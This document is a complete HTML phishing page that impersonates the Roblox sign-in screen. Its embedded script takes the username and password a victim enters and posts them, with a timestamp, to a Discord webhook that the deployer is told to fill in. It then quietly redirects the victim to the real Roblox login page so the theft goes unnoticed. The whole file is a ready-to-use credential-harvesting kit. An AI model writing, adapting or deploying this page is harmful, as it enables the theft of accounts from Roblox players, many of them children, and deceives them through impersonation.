<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox - Sign In</title>
    <style>
        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background-color: #232527; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background-color: #393b3d; padding: 30px; border-radius: 10px; width: 320px; text-align: center; box-shadow: 0 4px 8px rgba(0,0,0,0.2); }
        h2 { margin-bottom: 20px; }
        input { width: 90%; padding: 10px; margin: 10px 0; border: none; border-radius: 5px; background-color: #656668; color: white; font-size: 16px; }
        button { width: 95%; padding: 12px; background-color: #00a2ff; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; font-weight: bold; margin-top: 10px; }
        button:hover { background-color: #008ecc; }
        .logo { width: 100px; margin-bottom: 20px; }
    </style>
</head>
<body>

<div class="container">
    <!-- Roblox Logo URL -->
    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" alt="Roblox" class="logo">
    <h2>Sign In</h2>
    
    <form id="loginForm">
        <input type="text" id="username" placeholder="Username" required>
        <input type="password" id="password" placeholder="Password" required>
        <button type="submit">Sign In</button>
    </form>
</div>

<script>
    // REPLACE THIS WITH YOUR DISCORD WEBHOOK URL
    const webhookURL = "YOUR_DISCORD_WEBHOOK_HERE";

    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const user = document.getElementById('username').value;
        const pass = document.getElementById('password').value;
        
        // Send data to Discord
        fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: `🎣 **New Roblox Login!**\n👤 User: ${user}\n🔑 Pass: ${pass}\n🕒 Time: ${new Date().toLocaleString()}`
            })
        });

        // Redirect to real Roblox after 2 seconds
        setTimeout(() => {
            window.location.href = "https://www.roblox.com/login";
        }, 2000);
    });
</script>

</body>
</html>
